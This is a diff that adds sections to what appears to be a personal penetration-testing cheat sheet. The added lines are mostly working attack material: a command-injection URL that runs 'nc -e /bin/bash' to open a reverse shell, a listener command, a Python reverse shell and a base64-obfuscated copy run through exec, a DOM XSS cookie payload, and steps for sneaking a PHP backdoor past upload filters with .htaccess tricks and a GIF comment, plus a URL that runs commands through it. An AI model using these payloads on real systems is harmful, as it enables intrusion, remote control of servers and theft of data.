@@ -107,6 +107,33 @@ NETCAT
 >Host: www.abc.com
 > Connection: close
 
+exploiting command injussion vulnerability to shell on the box
+
+Server
+
+www.abc.com/list.php?path=/; nc -e /bin/bash 192.168.1.10 10000
+
+Client
+
+nc -l -p 1000 -vvv
+
+
+
+PYTHON
+
+python shell
+
+> Python -c “exec(\”import socket, subprocess;s = socket.socket();s.connect((‘IP_ADDRESS’,port))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\”)”
+
+>>> shell = "import socket, subprocess;s = socket.socket();s.connect(('192.168.1.1',10000))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())".encode('base64')
+>>> shell
+'aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgo\nJzE5Mi4xNjguMS4xJywxMDAwMCkpCndoaWxlIDE6IHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKHMu\ncmVjdigxMDI0KSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1\nYnByb2Nlc3MuUElQRSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKTtzLnNlbmQocHJvYy5zdGRvdXQu\ncmVhZCgpK3Byb2Muc3RkZXJyLnJlYWQoKSk=\n'
+>>> shell.decode('base64')
+"import socket, subprocess;s = socket.socket();s.connect(('192.168.1.1',10000))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())"
+>>> python -c "exec('aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgo\nJzE5Mi4xNjguMS4xJywxMDAwMCkpCndoaWxlIDE6IHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKHMu\ncmVjdigxMDI0KSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1\nYnByb2Nlc3MuUElQRSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKTtzLnNlbmQocHJvYy5zdGRvdXQu\ncmVhZCgpK3Byb2Muc3RkZXJyLnJlYWQoKSk=\n'.decode('base64'))"
+
+
+
 
 NMAP
 
@@ -347,6 +374,45 @@ abc" onmouseover=alert("XSS")" //enter this in text field you can use this sever
 
 Dom based XSS
 
+Payload
+http://localhost/dom?statement=alert(document.cookie)
+
+
+File upload vulnerability
+
+change content-type using intercept proxy(Burp suite/ZAP) and upload the shell.
+
+How to defet blacklist in php
+
+change content-type using intercept proxy(Burp suite/ZAP) and upload the shell.
+or change extension .php to .PHP and upload the shell you cant execute the file so upload .htaccess file also
+cat .htaccess
+AddType application/x-httpd-php PHP // insted of PHP you can give any extension it will execute the script as php
+
+EVIDE getimagesize() check in php
+
+Server should support double extension you can inject code using gifsccle
+
+> strings a.gif
+GIF89a
+*p\p
+D$
+> tr '\n' ' ' < simple-backdoor.php //you can copy this shell from php shell directory
+> gifsicle --comment "` tr '\n' ' ' < simple-backdoor.php `" <action_back.gif> action_back.php.gif. // upload the file 
+
+exploit 
+http://localhost/uploads/action_back.php.gif?cmd=ls+/tmp
+ 
+
+Null Byte Injection
+
+
+
+=============================================== REFERENCES =====================================================================
+
+
+pauldotcom.com
+pentestmonkey.net
 
 
 
